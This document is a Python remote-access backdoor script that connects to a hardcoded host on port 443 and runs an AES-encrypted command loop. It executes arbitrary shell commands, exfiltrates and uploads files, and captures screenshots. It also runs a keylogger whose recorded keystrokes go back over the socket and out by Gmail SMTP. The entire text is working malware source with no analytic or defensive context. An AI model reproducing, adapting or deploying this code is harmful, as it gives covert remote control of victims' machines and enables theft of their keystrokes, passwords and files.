#!/usr/bin/python

import subprocess,socket,base64,pyxhook,time,smtplib,string
from Crypto.Cipher import AES
from Crypto import Random
from datetime import datetime
from autopy import bitmap
from threading import Timer

TOGGLE = 0
list_to_save = []
start = time.time()
end = time.time()
new_hook = pyxhook.HookManager()

def std_command(cmd):
    pipe = subprocess.PIPE
    proc = subprocess.Popen(cmd,shell=True,stdout=pipe,stderr=pipe,stdin=pipe)
    stdoutput = proc.stdout.read() + proc.stderr.read()
    s.send(EncodeAES(cipher, stdoutput))

def download_file(filename):
    f = open(filename[9:], "r")
    f_content = f.read()
    s.send(EncodeAES(cipher, str(f_content)))
    f.close()

def upload_file(file_to_create):
    file_to_create = file_to_create[7:].split("&")
    f = open("uploaded_"+file_to_create[0], "w")
    f.write(file_to_create[1])
    f.close()
    s.send(EncodeAES(cipher, "File uploaded\n"))

def take_screenshot():
    screen = bitmap.capture_screen()
    fname = "Screenshot "+str(datetime.now())+".png"
    screen.save(fname)
    f = open(fname,"r")
    fcont = f.read()
    s.send(EncodeAES(cipher,fcont))

def OnKeyPress(event):
    global start
    global end
    global TOGGLE
    global list_to_save

    start = time.time()

    if (end - start) < -0.75:
        TOGGLE = 1
    
    if TOGGLE == 1:
        list_to_save.append('\n')
        TOGGLE = 0

    if event.Ascii == 96:
        new_hook.cancel()

    end = time.time()

    if event.Key == "period":
        event.Key = "."
    elif event.Key == "space":
        event.Key = " "
    elif event.Key == "at":
        event.Key = "@"
    elif event.Key == "Shift_R":
        event.Key = ""
    elif event.Key == "Return":
        event.Key = "\n"
    elif event.Key == "exclam":
        event.Key = "!"
    elif event.Key == "apostrophe":
        event.Key = "'"
    elif event.Key == "BackSpace":
        del list_to_save[-1]
        event.Key = ""
    
    list_to_save.append(event.Key)

def expire():
    global new_hook
    global list_to_save
    new_hook.cancel()
    to_send = "".join(list_to_save)
    del list_to_save
    if len(to_send) < 255:
        s.send(EncodeAES(cipher,to_send))
    To = ""
    From = ""
    Subj = "Keylog " + str(datetime.now())
    Text = to_send
    Body = string.join((
            "From: %s" % From,
            "To: %s" % To,
            "Subject: %s" % Subj,
            "",
            Text,
            ), "\r\n")
    mail = smtplib.SMTP("smtp.gmail.com", 587)
    mail.ehlo()
    mail.starttls()
    mail.login("", "")
    mail.sendmail("","",Body)
    mail.close()
    
def keylog(time_to_expire):
    global new_hook
    new_hook.KeyDown = OnKeyPress
    new_hook.HookKeyboard()
    new_hook.start()

    t = Timer(int(time_to_expire), expire)
    t.start()


BLOCK_SIZE = 32
PADDING = "{"
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c,s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c,e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
key = "31415926535897932384626433832795"
cipher = AES.new(key)

HOST = '192.168.0.112'
PORT = 443

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((HOST, PORT))
success = EncodeAES(cipher, "Hello friend...\n")
s.send(success)

while 1:
    data = DecodeAES(cipher, s.recv(5000))
    if data == "quit":
        break
    elif data.startswith("download"):
        download_file(data)
    elif data.startswith("upload"):
        upload_file(data)
    elif data.startswith("screenshot"):
        take_screenshot()
    elif data.startswith("keylog"):
        keylog(data.split(" ")[1])
    else:
        std_command(data)

#exit the loop
s.close()
